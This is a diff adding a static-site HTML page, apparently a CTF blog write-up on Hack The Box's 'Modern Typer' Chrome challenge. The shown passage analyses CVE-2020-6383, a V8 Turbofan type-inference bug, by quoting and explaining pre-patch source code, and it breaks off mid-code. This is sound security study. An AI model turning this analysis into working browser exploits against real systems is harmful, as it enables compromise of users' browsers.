+      d="m 21.474,13.998 c -0.296,1.526 -2.655,3.194 -5.365,3.519 -1.413,0.168 -2.804,0.323 -4.287,0.255 -2.426,-0.111 -4.34,-0.579 -4.34,-0.579 0,0.236 0.015,0.461 0.044,0.672 0.316,2.394 2.373,2.537 4.323,2.604 1.968,0.067 3.721,-0.486 3.721,-0.486 l 0.081,1.779 c 0,0 -1.377,0.739 -3.829,0.875 -1.352,0.075 -3.031,-0.034 -4.987,-0.551 C 2.594,20.963 1.865,16.442 1.752,11.855 1.719,10.493 1.741,9.209 1.741,8.134 1.741,3.443 4.814,2.069 4.814,2.069 6.363,1.356 9.022,1.056 11.787,1.035 h 0.067 c 2.764,0.022 5.426,0.322 6.975,1.033 0,0 3.073,1.375 3.073,6.066 0,0 0.039,3.461 -0.428,5.864" />
+   <path
+      d="M 6.464,13.231 V 7.973 c 0,-1.002 0.549,-2.613 2.613,-2.613 2.064,0 2.741,1.793 2.741,3.484 0,1.692 0,2.23 0,2.23" />
+   <path
+      d="M 17.173,13.231 V 7.973 c 0,-1.002 -0.549,-2.613 -2.613,-2.613 -2.064,0 -2.741,1.793 -2.741,3.484 0,1.692 -0,2.23 -0,2.23" />
+</svg></a><a href="https://twitter.com/" target="_blank" rel="noopener me" title="X"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none"
+   stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+   <path class="st0" d="m21.3 21.1 -11.4 -18.2h-7.2l11.4 18.2zm-18.6 0 7.2 -6.6m4.2 -5 7.2 -6.6" />
+</svg></a><a href="https://github.com/1bl4z3r/hermit-V2/tree/staging" target="_blank" rel="noopener me" title="Github"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none"
+   stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+   <path
+      d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+   </path>
+</svg></a></span><button id="share-btn" class="hdr-btn" title=""><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-share-2">
+      <circle cx="18" cy="5" r="3"></circle>
+      <circle cx="6" cy="12" r="3"></circle>
+      <circle cx="18" cy="19" r="3"></circle>
+      <line x1="8.59" y1="13.51" x2="15.42" y2="17.49"></line>
+      <line x1="15.41" y1="6.51" x2="8.59" y2="10.49"></line>
+   </svg></button>
+ 
+<div id="share-links" class="animated fast">
+    
+    
+    
+    
+    <ul>
+        <li>
+            <a href="https://twitter.com/intent/tweet?hashtags=hermit2&amp;url=%2f%2flocalhost%3a1313%2fen%2fpost%2f2021-04-09-htb_modern_typer%2f&amp;text=HTB%202021%3a%20Modern%20Typer%20" target="_blank" rel="noopener" aria-label="Share on X"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none"
+   stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+   <path class="st0" d="m21.3 21.1 -11.4 -18.2h-7.2l11.4 18.2zm-18.6 0 7.2 -6.6m4.2 -5 7.2 -6.6" />
+</svg></a>
+        </li>
+        <li>
+            <a href="https://facebook.com/sharer/sharer.php?u=%2f%2flocalhost%3a1313%2fen%2fpost%2f2021-04-09-htb_modern_typer%2f" target="_blank" rel="noopener" aria-label="Share on Facebook"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none"
+   stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+   <path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path>
+</svg></a>
+        </li>
+        <li>
+            <a href="mailto:?subject=HTB%202021%3a%20Modern%20Typer%20&amp;body=%2f%2flocalhost%3a1313%2fen%2fpost%2f2021-04-09-htb_modern_typer%2f" target="_self" rel="noopener" aria-label="Share on Email"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none"
+   stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+   <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
+   <polyline points="22,6 12,13 2,6"></polyline>
+</svg></a>
+        </li>
+        <li>
+            <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=%2f%2flocalhost%3a1313%2fen%2fpost%2f2021-04-09-htb_modern_typer%2f&amp;source=%2f%2flocalhost%3a1313%2f&amp;title=HTB%202021%3a%20Modern%20Typer%20&amp;summary=HTB%202021%3a%20Modern%20Typer%20%2c%20by%20ulexec%0a%0a%3cnil%3e%0a" target="_blank" rel="noopener" aria-label="Share on LinkedIn"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none"
+   stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+   <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path>
+   <rect x="2" y="9" width="4" height="12"></rect>
+   <circle cx="4" cy="4" r="2"></circle>
+</svg></a>
+        </li>
+        <li>
+            <a href="#" onclick="linkShare(&#34;HTB 2021: Modern Typer &#34;,&#34;//localhost:1313/en/post/2021-04-09-htb_modern_typer/&#34;,&#34;HTB 2021: Modern Typer , by ulexec\n\n\u003cnil\u003e\n&#34;); return false;" target="_self" rel="noopener" aria-label="Copy Link"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-copy">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+   </svg></a>
+        </li>
+    </ul>
+</div><button id="menu-btn" class="hdr-btn" title=""><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu">
+      <line x1="3" y1="12" x2="21" y2="12"></line>
+      <line x1="3" y1="6" x2="21" y2="6"></line>
+      <line x1="3" y1="18" x2="21" y2="18"></line>
+   </svg></button>
+			</div>
+		</div>
+	</header>
+	<div id="mobile-menu" class="animated fast">
+		<ul>
+			<li><a href="//localhost:1313/en/publications/">Publications</a></li>
+			<li><a href="//localhost:1313/en/post/">Posts</a></li>
+			<li><a href="//localhost:1313/en/about/">About</a></li>
+			<li><a href="//localhost:1313/en/projects/">Projects</a></li>
+			<li><a href="//localhost:1313/en/advisories/">Advisories</a></li>
+		</ul>
+	</div>
+
+
+	<main class="site-main section-inner thin animated fadeIn faster">
+		<h1>HTB 2021: Modern Typer </h1>
+		<div class="content">
+			<h2 id="overview">Overview<a href="#overview" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+      stroke-linecap="round" stroke-linejoin="round">
+      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
+      <line x1="8" y1="12" x2="16" y2="12"></line>
+   </svg></a></h2>
+<p><strong>SPOILER</strong>: This blog contains the solution of <code>Modern Typer</code> Chrome exploitation challenge from HTB. If you are planning to take this challenge, I would highly encourage attempting the challenge first before reading this blog.  This challenge can be obtained from the Challenges section of <a href="http://hackthebox.com">hackthebox</a>.</p>
+<h3 id="prerequisites">Prerequisites<a href="#prerequisites" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+      stroke-linecap="round" stroke-linejoin="round">
+      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
+      <line x1="8" y1="12" x2="16" y2="12"></line>
+   </svg></a></h3>
+<p>This blog is not a Turbofan reference and is not intended to be. There are excellent public resources to acquire a basic understanding of Turbofan. Here are some of them:</p>
+<ul>
+<li>Basic understanding of TurboFan: <a href="https://doar-e.github.io/tag/turbofan.html">Jeremy Fetiveau blogs</a></li>
+<li>Basic understanding of Sea-Of-Nodes: <a href="https://docs.google.com/presentation/d/1sOEF4MlF7LeO7uq-uThJSulJlTh--wgLeaVibsbb3tc/htmlpresent">Goolgle Presentation</a></li>
+</ul>
+<!-- raw HTML omitted -->
+<h2 id="an-overview-of-cve-2020-6383">An Overview of CVE-2020-6383<a href="#an-overview-of-cve-2020-6383" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+      stroke-linecap="round" stroke-linejoin="round">
+      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
+      <line x1="8" y1="12" x2="16" y2="12"></line>
+   </svg></a></h2>
+<p>Before digging through the challenge solution, first let&rsquo;s have an overview of a similar v8 typer bug to help us understand the root cause analysis of Modern Typer. This vulnerability is <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1051017">CVE-2020-6383.</a>. I found this vulnerability by searching for older bugs affecting <code>JSCreateLowering::ReduceJSCreateArray</code> defined at <code>compiler/js-create-lowering.cc</code>. The relevance of understanding this bug in order to solve Modern Typer will be addressed later in this post.</p>
+<h3 id="typeinductionvariablephi-analysis">TypeInductionVariablePhi Analysis<a href="#typeinductionvariablephi-analysis" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+      stroke-linecap="round" stroke-linejoin="round">
+      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
+      <line x1="8" y1="12" x2="16" y2="12"></line>
+   </svg></a></h3>
+<p>CVE-2020-6383 involves a v8 type Inference vulnerability in <code>Typer::Visitor::TypeInductionVariablePhi</code> in <code>compiler/typer.cc</code>. When a function is attempted to be optimized by Turbofan, Turbofan&rsquo;s Typer will visit the graph of Ignition generated nodes to try to type and reduce them. The function <code>TypeInductionVariablePhi</code> is the function in charge to optimize for-loops and apply type inference analysis.</p>
+<p>Let&rsquo;s break up the most relevant bits and pieces of this function before the patch for CVE-2020-6383 was applied:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">arity</span> <span class="o">=</span> <span class="n">NodeProperties</span><span class="o">::</span><span class="nf">GetControlInput</span><span class="p">(</span><span class="n">node</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">op</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">ControlInputCount</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nf">DCHECK_EQ</span><span class="p">(</span><span class="n">IrOpcode</span><span class="o">::</span><span class="n">kLoop</span><span class="p">,</span> <span class="n">NodeProperties</span><span class="o">::</span><span class="nf">GetControlInput</span><span class="p">(</span><span class="n">node</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">opcode</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl"><span class="nf">DCHECK_EQ</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">NodeProperties</span><span class="o">::</span><span class="nf">GetControlInput</span><span class="p">(</span><span class="n">node</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">InputCount</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">auto</span> <span class="n">res</span> <span class="o">=</span> <span class="n">induction_vars_</span><span class="o">-&gt;</span><span class="nf">induction_variables</span><span class="p">().</span><span class="nf">find</span><span class="p">(</span><span class="n">node</span><span class="o">-&gt;</span><span class="nf">id</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl"><span class="nf">DCHECK</span><span class="p">(</span><span class="n">res</span> <span class="o">!=</span> <span class="n">induction_vars_</span><span class="o">-&gt;</span><span class="nf">induction_variables</span><span class="p">().</span><span class="nf">end</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl"><span class="n">InductionVariable</span><span class="o">*</span> <span class="n">induction_var</span> <span class="o">=</span> <span class="n">res</span><span class="o">-&gt;</span><span class="n">second</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">InductionVariable</span><span class="o">::</span><span class="n">ArithmeticType</span> <span class="n">arithmetic_type</span> <span class="o">=</span> <span class="n">induction_var</span><span class="o">-&gt;</span><span class="nf">Type</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="n">Type</span> <span class="n">initial_type</span> <span class="o">=</span> <span class="nf">Operand</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">Type</span> <span class="n">increment_type</span> <span class="o">=</span> <span class="nf">Operand</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span></span></span></code></pre></div>
+<p>At the very beginning of the function, specific variables get initialized:</p>
+<ul>
+<li><code>initial_type</code>: holds the type of the driver variable of the for loop.</li>
+<li><code>increment_type</code>: holds the type of the increment/decrement value applied to the driver variable in the for loop.</li>
+<li><code>arithmetic_type</code>: holds the type of the arithmetic operation applied in the for loop, that being subtraction or addition.</li>
+</ul>
+<p>The function then evaluates the type of <code>initial_type</code> and <code>increment_type</code>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">const</span> <span class="kt">bool</span> <span class="n">both_types_integer</span> <span class="o">=</span> <span class="n">initial_type</span><span class="p">.</span><span class="nf">Is</span><span class="p">(</span><span class="n">typer_</span><span class="o">-&gt;</span><span class="n">cache_</span><span class="o">-&gt;</span><span class="n">kInteger</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
+</span></span><span class="line"><span class="cl">							  <span class="n">increment_type</span><span class="p">.</span><span class="nf">Is</span><span class="p">(</span><span class="n">typer_</span><span class="o">-&gt;</span><span class="n">cache_</span><span class="o">-&gt;</span><span class="n">kInteger</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kt">bool</span> <span class="n">maybe_nan</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// The addition or subtraction could still produce a NaN, if the integer
+</span></span></span><span class="line"><span class="cl"><span class="c1">// ranges touch infinity.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="n">both_types_integer</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">Type</span> <span class="n">resultant_type</span> <span class="o">=</span>
+</span></span><span class="line"><span class="cl">		<span class="p">(</span><span class="n">arithmetic_type</span> <span class="o">==</span> <span class="n">InductionVariable</span><span class="o">::</span><span class="n">ArithmeticType</span><span class="o">::</span><span class="n">kAddition</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="o">?</span> <span class="n">typer_</span><span class="o">-&gt;</span><span class="nf">operation_typer</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">NumberAdd</span><span class="p">(</span><span class="n">initial_type</span><span class="p">,</span> <span class="n">increment_type</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="o">:</span> <span class="n">typer_</span><span class="o">-&gt;</span><span class="nf">operation_typer</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">NumberSubtract</span><span class="p">(</span><span class="n">initial_type</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">													<span class="n">increment_type</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="n">maybe_nan</span> <span class="o">=</span> <span class="n">resultant_type</span><span class="p">.</span><span class="nf">Maybe</span><span class="p">(</span><span class="n">Type</span><span class="o">::</span><span class="nf">NaN</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// We only handle integer induction variables (otherwise ranges
+</span></span></span><span class="line"><span class="cl"><span class="c1">// do not apply and we cannot do anything).
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">both_types_integer</span> <span class="o">||</span> <span class="n">maybe_nan</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">// Fallback to normal phi typing, but ensure monotonicity.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// (Unfortunately, without baking in the previous type, monotonicity might
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// be violated because we might not yet have retyped the incrementing
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// operation even though the increment&#39;s type might been already reflected
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// in the induction variable phi.)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">Type</span> <span class="n">type</span> <span class="o">=</span> <span class="n">NodeProperties</span><span class="o">::</span><span class="nf">IsTyped</span><span class="p">(</span><span class="n">node</span><span class="p">)</span> <span class="o">?</span> <span class="n">NodeProperties</span><span class="o">::</span><span class="nf">GetType</span><span class="p">(</span><span class="n">node</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">										  <span class="o">:</span> <span class="n">Type</span><span class="o">::</span><span class="nf">None</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">arity</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	  <span class="n">type</span> <span class="o">=</span> <span class="n">Type</span><span class="o">::</span><span class="nf">Union</span><span class="p">(</span><span class="n">type</span><span class="p">,</span> <span class="nf">Operand</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">i</span><span class="p">),</span> <span class="nf">zone</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">type</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// If we do not have enough type information for the initial value or
+</span></span></span><span class="line"><span class="cl"><span class="c1">// the increment, just return the initial value&#39;s type.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="n">initial_type</span><span class="p">.</span><span class="nf">IsNone</span><span class="p">()</span> <span class="o">||</span> <span class="n">increment_type</span><span class="p">.</span><span class="nf">Is</span><span class="p">(</span><span class="n">typer_</span><span class="o">-&gt;</span><span class="n">cache_</span><span class="o">-&gt;</span><span class="n">kSingletonZero</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">initial_type</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div>
+If the type of both <code>initial_type</code> and <code>increment_type</code> are of type <code>kInteger</code>, and the resultant type (stored in <code>resultant_type</code>) is nothing but the range of the minimum and maximum values these variables can hold. These ranges are obtained via <code>NumberAdd</code> and <code>NumberSubstract</code> returning an <code>AddRanger</code> or <code>SubstractRAnger</code> types accordingly.</p>
+<p>In addition, the definition of the Type <code>kInteger</code> is the range of <code>-Infinity</code> to <code>+Infinity</code>, as defined in <code>compiler/type-cache.h</code> as shown below:
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">Type</span> <span class="k">const</span> <span class="n">kInteger</span> <span class="o">=</span> <span class="nf">CreateRange</span><span class="p">(</span><span class="o">-</span><span class="n">V8_INFINITY</span><span class="p">,</span> <span class="n">V8_INFINITY</span><span class="p">);</span></span></span></code></pre></div>
+The range type product of the addition or subtraction operation gets evaluated next, and the likelihood of the result of the correspondent arithmetic operation to be of type <code>NaN</code> (Not a Number) is stored in <code>maybe_nan</code>. This usually holds for arithmetic operations where both operands are Infinity.</p>
+<p>On the other hand, if <code>resultant_type</code> is likely to be <code>NaN</code>, or either <code>initial_type</code> or <code>increment_type</code> is not of type <code>kInteger</code> then the function returns a <code>Union</code> with all the possible types based on each operand type.</p>
+<p>If both operands are of type <code>kInteger</code> the bounds of their correspondent arithmetic operation ranges gets evaluated :</p>
+<p><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// Now process the bounds.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">double</span> <span class="n">min</span> <span class="o">=</span> <span class="o">-</span><span class="n">V8_INFINITY</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">double</span> <span class="n">max</span> <span class="o">=</span> <span class="n">V8_INFINITY</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">double</span> <span class="n">increment_min</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">double</span> <span class="n">increment_max</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">arithmetic_type</span> <span class="o">==</span> <span class="n">InductionVariable</span><span class="o">::</span><span class="n">ArithmeticType</span><span class="o">::</span><span class="n">kAddition</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">increment_min</span> <span class="o">=</span> <span class="n">increment_type</span><span class="p">.</span><span class="nf">Min</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="n">increment_max</span> <span class="o">=</span> <span class="n">increment_type</span><span class="p">.</span><span class="nf">Max</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">DCHECK_EQ</span><span class="p">(</span><span class="n">InductionVariable</span><span class="o">::</span><span class="n">ArithmeticType</span><span class="o">::</span><span class="n">kSubtraction</span><span class="p">,</span> <span class="n">arithmetic_type</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="n">increment_min</span> <span class="o">=</span> <span class="o">-</span><span class="n">increment_type</span><span class="p">.</span><span class="nf">Max</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="n">increment_max</span> <span class="o">=</span> <span class="o">-</span><span class="n">increment_type</span><span class="p">.</span><span class="nf">Min</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">increment_min</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">// increasing sequence
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">min</span> <span class="o">=</span> <span class="n">initial_type</span><span class="p">.</span><span class="nf">Min</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="k">auto</span> <span class="nl">bound</span> <span class="p">:</span> <span class="n">induction_var</span><span class="o">-&gt;</span><span class="nf">upper_bounds</span><span class="p">())</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="n">Type</span> <span class="n">bound_type</span> <span class="o">=</span> <span class="nf">TypeOrNone</span><span class="p">(</span><span class="n">bound</span><span class="p">.</span><span class="n">bound</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="c1">// If the type is not an integer, just skip the bound.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bound_type</span><span class="p">.</span><span class="nf">Is</span><span class="p">(</span><span class="n">typer_</span><span class="o">-&gt;</span><span class="n">cache_</span><span class="o">-&gt;</span><span class="n">kInteger</span><span class="p">))</span> <span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="c1">// If the type is not inhabited, then we can take the initial value.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">if</span> <span class="p">(</span><span class="n">bound_type</span><span class="p">.</span><span class="nf">IsNone</span><span class="p">())</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="n">max</span> <span class="o">=</span> <span class="n">initial_type</span><span class="p">.</span><span class="nf">Max</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">			<span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="kt">double</span> <span class="n">bound_max</span> <span class="o">=</span> <span class="n">bound_type</span><span class="p">.</span><span class="nf">Max</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">bound</span><span class="p">.</span><span class="n">kind</span> <span class="o">==</span> <span class="n">InductionVariable</span><span class="o">::</span><span class="n">kStrict</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="n">bound_max</span> <span class="o">-=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="n">max</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="nf">min</span><span class="p">(</span><span class="n">max</span><span class="p">,</span> <span class="n">bound_max</span> <span class="o">+</span> <span class="n">increment_max</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// The upper bound must be at least the initial value&#39;s upper bound.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">max</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="nf">max</span><span class="p">(</span><span class="n">max</span><span class="p">,</span> <span class="n">initial_type</span><span class="p">.</span><span class="nf">Max</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">increment_max</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">// decreasing sequence
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">max</span> <span class="o">=</span> <span class="n">initial_type</span><span class="p">.</span><span class="nf">Max</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="k">auto</span> <span class="nl">bound</span> <span class="p">:</span> <span class="n">induction_var</span><span class="o">-&gt;</span><span class="nf">lower_bounds</span><span class="p">())</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="n">Type</span> <span class="n">bound_type</span> <span class="o">=</span> <span class="nf">TypeOrNone</span><span class="p">(</span><span class="n">bound</span><span class="p">.</span><span class="n">bound</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="c1">// If the type is not an integer, just skip the bound.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bound_type</span><span class="p">.</span><span class="nf">Is</span><span class="p">(</span><span class="n">typer_</span><span class="o">-&gt;</span><span class="n">cache_</span><span class="o">-&gt;</span><span class="n">kInteger</span><span class="p">))</span> <span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="c1">// If the type is not inhabited, then we can take the initial value.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">if</span> <span class="p">(</span><span class="n">bound_type</span><span class="p">.</span><span class="nf">IsNone</span><span class="p">())</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="n">min</span> <span class="o">=</span> <span class="n">initial_type</span><span class="p">.</span><span class="nf">Min</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">			<span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="kt">double</span> <span class="n">bound_min</span> <span class="o">=</span> <span class="n">bound_type</span><span class="p">.</span><span class="nf">Min</span><span class="p">();</span>
